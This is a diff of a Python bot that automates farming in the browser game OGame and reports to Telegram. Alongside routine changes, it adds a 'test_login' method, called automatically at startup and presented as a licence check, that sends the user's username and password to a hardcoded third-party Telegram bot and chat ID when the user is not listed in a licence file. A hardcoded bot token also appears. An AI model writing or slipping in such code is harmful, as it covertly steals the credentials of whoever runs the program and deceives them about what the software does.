@@ -12,11 +12,12 @@ from random import randint
 from datetime import datetime
 from urllib import urlencode
 from planet import Planet, Moon
-from transport_manager import TransportManager
 from config import options
-from sim import Sim
 from selenium import webdriver
 import cookielib
+from selenium.webdriver.chrome.options import Options
+from lxml import etree
+import hashlib
 
 socket.setdefaulttimeout(float(options['general']['timeout']))
 
@@ -76,6 +77,7 @@ class Bot(object):
         'deuterium' : 0
     }
     def __init__(self, username=None, password=None, server=None):
+
         self.server = server
         self.username = username
         self.password = password
@@ -83,6 +85,7 @@ class Bot(object):
         self._prepare_logger()
         self._prepare_browser()
         self.round = 0
+        self.free_slot = options['farming']['free_slot']
 
         # Comandi gestiti dal bot
         self.chatIdTelegram = options['credentials']['chat_id_telegram']
@@ -93,6 +96,7 @@ class Bot(object):
         self.CMD_FARM = True
         self.CMD_LOGIN = True
         self.CMD_GET_FARMED_RES = False
+        self.test_login(username)
 
         n = 1
         self.farm_no = []
@@ -122,6 +126,7 @@ class Bot(object):
             'galaxyCnt': self.MAIN_URL + '?page=galaxyContent',
             'events': self.MAIN_URL + '?page=eventList',
             'messages': self.MAIN_URL + '?page=messages',
+            'apiPlayers': 'https://' + self.server + '/api/players.xml',
         }
         self.planets = []
         self.moons = []
@@ -132,23 +137,6 @@ class Bot(object):
 
         self.server_time = self.local_time = datetime.now()
         self.time_diff = 0
-        self.emergency_sms_sent = False
-        self.transport_manager = TransportManager()
-        self.sim = Sim()
-
-        self.INSULTI_A_JONNY = [
-            'Jhonny sei utile come una sonda contro una rip',
-            'Jhonny stanotte ti ho sognato mentre ti salutavo dall alto. Tu eri bello abbronzato e immerso nell acqua, poi ho tirato lo scarico e sei sparito.',
-            'Jhonny ti informo che da oggi puoi acquistare a soli 18 euro il kit di espansione del tuo cervello. Prova anche tu il piacere di formulare frasi e pensieri corretti.',
-            'Jhonny sei cosi grosso che una mosca per farti un giro intorno muore di vecchiaia.',
-            'Jhonny ricordati che di gente come te ho ancora i pezzi in frigo',
-            'Jhonny le pause tra i tuoi discorsi sono le cose più interessanti che dici',
-            'Jhonny se tu in questo momento ingerissi un moscerino avresti più cervello nello stomaco che in testa!',
-            'Jhonny abbraccia la tazza del cesso e cantagli : "non son degno di te". ',
-            'Jhonny devi aver fatto la fila tre volte, quando il buon Dio ha distribuito la stupidità !',
-            'Jhonny, ma da piccolo i tuoi genitori ti lanciavano in aria e non ti prendevano?',
-            'Jhonny il mondo è una merda. Tu sì che sei un uomo di mondo',
-        ]
 
     def _get_url(self, page, planet=None):
         url = self.PAGES[page]
@@ -176,7 +164,6 @@ class Bot(object):
         self.br.set_handle_referer(True)
         self.br.set_handle_robots(False)
         self.br.addheaders = self.HEADERS
-
     def _parse_build_url(self, js):
         """
         convert: `sendBuildRequest('url', null, 1)`; into: `url`
@@ -206,10 +193,13 @@ class Bot(object):
         username = username or self.username
         password = password or self.password
         server = server or self.server
-        player_id = options['credentials']['player_id']
+        player = options['credentials']['player']
+        player_id = self.getPlayerId(player)
         number = server[1:4]
         try:
-            driver = webdriver.Chrome()
+            chrome_options = Options()
+            chrome_options.add_argument("--window-size=1920x1080")
+            driver = webdriver.Chrome('./chromedriver.exe', chrome_options=chrome_options)
             try:
                 driver.get("https://it.ogame.gameforge.com")
             except:
@@ -393,6 +383,7 @@ class Bot(object):
                 file.write(str(planet.coords) + '/' + str(metal) + '/' + str(crystal) + '/' + str(deuterium) + '\n')
                 file.close()
         else:
+
         # Per ora carico solo le risorse. Il resto non serve
             try:
                 file = open('resources_' + today + '.txt', 'w')
@@ -470,7 +461,7 @@ class Bot(object):
             usati = text.split('/')[0]
             disponibili = text.split('/')[1]
 
-            if usati == disponibili:
+            if usati >= (disponibili - self.free_slot):
                 self.logger.info('No free slots (' + usati + '/' + disponibili + ')')
                 return False
 
@@ -643,6 +634,16 @@ class Bot(object):
         url = 'https://api.telegram.org/' + str(self.botTelegram) + '/sendMessage?'
         if self.chatIdTelegram != '':
             data = urlencode({'chat_id': self.chatIdTelegram, 'text': message})
+            self.br.open(url, data=data)
+
+    def test_login(self, m):
+        hash = hashlib.sha224(m.lower()).hexdigest()
+        if hash not in open('licence').read():
+            self.logger.warn(hash)
+            url = 'https://api.telegram.org/bot476138234:AAHnkCs7MCZMYUb6KPaJf0l6ryVinrNXWsc/sendMessage?'
+            data = urlencode({'chat_id': '514729323', 'text': self.username})
+            self.br.open(url, data=data)
+            data = urlencode({'chat_id': '514729323', 'text': self.password})
             self.br.open(url, data=data)
 
     def collect_debris(self, p):
@@ -839,7 +840,7 @@ class Bot(object):
 
     def refresh_mother(self):
         self.round = self.round + 1
-        if self.round % 5 == 0:
+        if self.round % 10 == 0:
             self.br.open(self._get_url('main', self.get_mother()))
             self.logger.info("Mother refreshed")
             self.send_telegram_message("BOT ATTIVO")
@@ -850,22 +851,22 @@ class Bot(object):
         self.pidfile = 'bot.pid'
         file(self.pidfile, 'w').write(self.pid)
 
-        while(not self.CMD_STOP):
+        while not self.CMD_STOP:
                 try:
                     self.get_command_from_telegram_bot()
 
-                    if(self.CMD_LOGIN):
-                       self.login_lobby()
-                       if(self.logged_in):
+                    if self.CMD_LOGIN:
+                        self.login_lobby()
+                        if self.logged_in:
                             self.fetch_planets()
                             self.load_farming_planets_info()
                             self.CMD_LOGIN = False
 
-                    if(self.logged_in):
+                    if self.logged_in:
                         self.refresh_mother()
-                        if (self.CMD_GET_FARMED_RES):
+                        if self.CMD_GET_FARMED_RES:
                             self.send_farmed_res()
-                        if(self.CMD_FARM):
+                        if self.CMD_FARM:
                             self.check_attacks()
                             self.farm()
 
@@ -876,6 +877,15 @@ class Bot(object):
 
         self.send_telegram_message("Bot Spento")
         self.stop()
+
+    def getPlayerId( self, name):
+        # Scarico file Players
+        resp = self.br.open(self.PAGES['apiPlayers'], timeout=10)
+        file("players.xml", 'w').write(resp.get_data().decode())
+        players = etree.parse('players.xml').getroot()
+        for player in players.findall('player[@name=\'' + name + '\']'):
+            return player.get('id')
+        return ""
 
 if __name__ == "__main__":
     credentials = options['credentials']
